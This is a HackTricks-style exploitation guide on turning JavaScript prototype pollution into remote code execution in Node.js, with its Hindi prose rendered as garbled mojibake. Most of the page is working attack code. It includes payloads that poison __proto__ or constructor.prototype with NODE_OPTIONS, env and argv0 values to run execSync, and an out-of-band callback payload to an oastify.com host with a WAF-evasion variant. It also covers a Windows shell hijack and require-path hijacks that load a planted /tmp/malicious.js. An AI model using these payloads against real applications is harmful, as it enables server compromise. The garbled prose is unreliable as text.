# Prototype Pollution to RCE

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## Vulnerable Code

рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ JS рдХреА рддрд░рд╣ рдХреБрдЫ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рд╕реЛрдЪреЗрдВ:

```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```

## PP2RCE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ env vars

**PP2RCE** рдХрд╛ рдорддрд▓рдм рд╣реИ **Prototype Pollution to RCE** (Remote Code Execution).

рдЗрд╕ [**writeup**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЬрдм рдХреЛрдИ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ spawn** рд╣реЛрддреА рд╣реИ рдХрд┐рд╕реА **`child_process`** рд╕реЗ (рдЬреИрд╕реЗ `fork` рдпрд╛ `spawn` рдпрд╛ рдЕрдиреНрдп) рддреЛ рдпрд╣ рдЙрд╕ method `normalizeSpawnArguments` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ **prototype pollution gadget рд╣реИ рдЬреЛ рдирдП env vars рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП** :

```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```

### **рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ `__proto__`**

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`child_process`** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ **`normalizeSpawnArguments`** рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреЗ рдХрд╛рд░рдг, рдЬрдм рдХреБрдЫ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ env рд╡реЗрд░рд┐рдПрдмрд▓ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рддреЛ рдЖрдкрдХреЛ рдмрд╕ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЛ **рдкреЙрд▓реНрдпреВрдЯ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк `__proto__.avar="valuevar"` рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ `avar` рдирд╛рдо рдХреЗ рдПрдХ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рд╣реЛрдЧреА рдЬрд┐рд╕рдХрд╛ рдорд╛рди `valuevar` рд╣реЛрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдПрдирд╡реА рд╡реЗрд░рд┐рдПрдмрд▓ рдкрд╣рд▓рд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП** рдЖрдкрдХреЛ **`.env` рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ** рдХреЛ **рдкреЙрд▓реНрдпреВрдЯ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ (рдХреБрдЫ рдореЗрдердб рдореЗрдВ рдХреЗрд╡рд▓) рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ **рдкрд╣рд▓рд╛** рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рд╣рдорд▓реЗ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП)ред

рдЗрд╕рд▓рд┐рдП **`NODE_OPTIONS`** **`.env`** рдореЗрдВ рдирд╣реАрдВ рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓реЗ рдореЗрдВред
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### `constructor.prototype` рдХреЛ рдЬрд╣рд░ рджреЗрдирд╛

```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```

## PP2RCE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ env vars + cmdline

[**рдЗрд╕ рд▓реЗрдЦ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)\*\* рдореЗрдВ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЗ рд╕рдорд╛рди рдПрдХ рд╕рдорд╛рди payload рдХреЗ рд╕рд╛рде рдХреБрдЫ рдмрджрд▓рд╛рд╡ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЧрдП рдереЗред\*\* рдореБрдЦреНрдп рдЕрдВрддрд░ рд╣реИрдВ:

* рдлрд╝рд╛рдЗрд▓ `/proc/self/environ` рдореЗрдВ рдиреЛрдбрдЬреЗрдПрд╕ **рдкреЗрд▓реЛрдб** рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп, рдпрд╣ рдЗрд╕реЗ **`/proc/self/cmdline`** рдХреЗ **argv0** рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИред
* рдлрд┐рд░, **`NODE_OPTIONS`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рд╛рдЗрд▓ `/proc/self/environ` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ **`/proc/self/cmdline`** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```

## DNS рдЗрдВрдЯрд░реЗрдХреНрд╢рди

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд payloads рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NODE\_OPTIONS env var рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдкрд╣рд▓реЗ рдЪрд░реНрдЪрд╛ рдХреА рдереА рдФрд░ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛:

```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```

рдпрд╛, рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП WAFs рд╕реЗ рдкреВрдЫрдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП:

```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```

## PP2RCE vuln child\_process functions

рдЗрд╕ рдЦрдВрдб рдореЗрдВ рд╣рдо **`child_process` рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВрдЧреЗ** рддрд╛рдХрд┐ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдВ рдФрд░ рджреЗрдЦ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╣рдо рдХрд┐рд╕реА рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<details>

<summary><code>exec</code> рд╢реЛрд╖рдг</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

## рдмрд╛рд▓рдХ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛

рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдЖрдкрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдХ рдлрд╝рдВрдХреНрд╢рдиреИрд▓рд┐рдЯреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ `spawn` рдХреЛ рдХреЙрд▓ рдХрд░рддреА рд╣реИ** (рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`child_process`** рдХреЗ рд╕рднреА рд╡рд┐рдзрд┐рдпрд╛рдБ рдЗрд╕реЗ рдХреЙрд▓ рдХрд░рддреА рд╣реИрдВ)ред рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╡рд╣ **рдХреЛрдб рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдерд╛**, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдХреЛрдб **рдЗрд╕реЗ рдирд╣реАрдВ рдХреЙрд▓ рдХрд░ рд░рд╣рд╛ рд╣реИ**ред

### рдПрдХ рдЖрд╡рд╢реНрдпрдХ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛

рдЗрд╕ [**рдЕрдиреНрдп рд▓реЗрдЦ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ **`require`** рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрдЧрд╛ред рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рд╕рд┐рд░реНрдл **рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ `.js` рдлрд╝рд╛рдЗрд▓ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ** рдЬреЛ **рдЗрдВрдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдкрд░ рдПрдХ spawn рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧреА**ред\
рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдЬреЛ рдПрдХ spawn рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЗрдВрдкреЛрд░реНрдЯ рдХрд░рддреЗ рд╕рдордп рдХреЙрд▓ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд╣реИрдВ:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* **рдиреАрдЪреЗ рдЕрдзрд┐рдХ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬреЗрдВ**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд░рд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкреИрдбрд┐рдВрдЧ рдХреЗ** **child\_process** рд╕реЗ **рдХреЙрд▓** рдХреА рдЦреЛрдЬ рдХрд░реЗрдЧрд╛ (рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ рдХреЙрд▓ рджрд┐рдЦрд╛рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП):

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>рдкрд┐рдЫрд▓реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ рдкрд╛рдП рдЧрдП рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЗрдВ</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### Prototype рдкреНрд░рджреВрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ require рдлрд╝рд╛рдЗрд▓ рдкрде рд╕реЗрдЯ рдХрд░рдирд╛

{% hint style="warning" %}
**рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░реЗ** рдЬрд╛ рд░рд╣реА **рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде** рдЬреЛ **рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛**ред рд▓реЗрдХрд┐рди рдпрд╣ рд╣рдореЗрд╢рд╛ рд╕рдЪ рдирд╣реАрдВ рд╣реИред
{% endhint %}

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреЛрдб prototype рдкреНрд░рджреВрд╖рдг рдХреЗ рдмрд╛рдж рдПрдХ require рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрджрд┐ рдЖрдк **рдкрде рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗ** рд╣реИрдВ рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛, рддреЛ рдЖрдк **propotype рдкреНрд░рджреВрд╖рдг рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХреЛрдб рд▓рд╛рдЗрди рдРрд╕реА рд╣реИ `require("./a_file.js")` рдпрд╛ `require("bytes")` рддреЛ рдпрд╣ **рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджреВрд╖рд┐рдд рдкреИрдХреЗрдЬ рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдХрд░реЗрдЧрд╛**ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ prototype рдкреНрд░рджреВрд╖рдг рдХреЗ рдмрд╛рдж рдПрдХ require рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЛрдИ spawn рдХрд╛рд░реНрдп рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ рд╣рдорд▓рд╛ рд╣реИ:

* рдПрдХ **рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ `.js` рдлрд╝рд╛рдЗрд▓ рдЦреЛрдЬреЗрдВ** рдЬреЛ **`child_process` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдХреНрд░рд┐рдпрд╛ рдХрд░реЗрдЧреА**
* рдпрджрд┐ рдЖрдк рдЙрд╕ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕ рдкрд░ рдЖрдк рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк рдРрд╕реА рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **рдкрдереЛрдВ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░реЗрдВ** рддрд╛рдХрд┐ **`.js` рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдП** рдЬреЛ `child_process` рдХреЗ рд╕рд╛рде рдХреБрдЫ рдХрд░реЗрдЧреА
* рдПрдХреНрд╕реЗрдХреНрдпреВрд╢рди рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╕рдордп рд╡рд┐рд╡рд┐рдз рдХреЛрдб рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдкрд░реНрдпрд╛рд╡рд░рдг/cmdline рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░реЗрдВ** (рдкреНрд░рд╛рд░рдВрднрд┐рдХ рддрдХрдиреАрдХ рджреЗрдЦреЗрдВ)

#### рдкреВрд░реНрдг рдЖрд╡рд╢реНрдпрдХ

рдпрджрд┐ рдХрд┐рдпрд╛ рдЧрдпрд╛ require **рдкреВрд░реНрдг** рд╣реИ (`require("bytes")`) рдФрд░ **рдкреИрдХреЗрдЬ рдореЗрдВ рдореБрдЦреНрдп рдирд╣реАрдВ рд╣реИ** `package.json` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ, рддреЛ рдЖрдк **`main` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЖрд╡рд╢реНрдпрдХ рдХреЛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}

```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```

#### рд╕рд╛рдкреЗрдХреНрд╖ рдкрде - 1

рдпрджрд┐ рдПрдХ **рд╕рд╛рдкреЗрдХреНрд╖ рдкрде** рдХреЛ рдПрдХ рдкреВрд░реНрдг рдкрде рдХреА рдмрдЬрд╛рдп рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдиреЛрдб рдХреЛ **рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдкрде рд▓реЛрдб** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```

```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```

#### рд╕рд╛рдВрдЦреНрдпрд┐рдХ рдЖрд╡рд╢реНрдпрдХрддрд╛ - 2

{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}

\`\`\`javascript const { fork } = require('child\_process'); console.log("Hellooo from malicious"); fork('/path/to/anything'); \`\`\` #### рд╕рд╛рдкреЗрдХреНрд╖ рдЖрд╡рд╢реНрдпрдХрддрд╛ - 3

